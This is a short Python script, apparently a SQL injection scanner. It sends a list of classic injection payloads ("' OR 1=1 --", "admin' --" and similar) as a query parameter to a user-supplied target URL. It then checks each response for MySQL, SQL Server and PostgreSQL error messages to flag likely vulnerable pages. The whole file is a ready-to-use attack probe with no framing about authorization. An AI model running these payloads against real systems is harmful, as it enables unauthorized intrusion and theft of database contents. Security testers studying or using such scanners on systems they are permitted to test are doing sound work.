import requests


payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR '1'='1'/*",
    "admin' --",
    "' OR 1=1 LIMIT 1 --",
]


url = "http://example.com/vulnerable_page.php"  # Replace with the target URL


param_name = "id"

def check_vulnerability(url, param_name):
    vulnerable = False

    for payload in payloads:
       
        params = {param_name: payload}
        response = requests.get(url, params=params)

        
        if any(error in response.text for error in [
            "You have an error in your SQL syntax",
            "Warning: mysql_fetch",
            "Unclosed quotation mark after the character string",
            "quoted string not properly terminated",
        ]):
            print(f"Potential SQL Injection Vulnerability Found with payload: {payload}")
            vulnerable = True

    if not vulnerable:
        print("No SQL Injection vulnerabilities found.")


check_vulnerability(url, param_name)
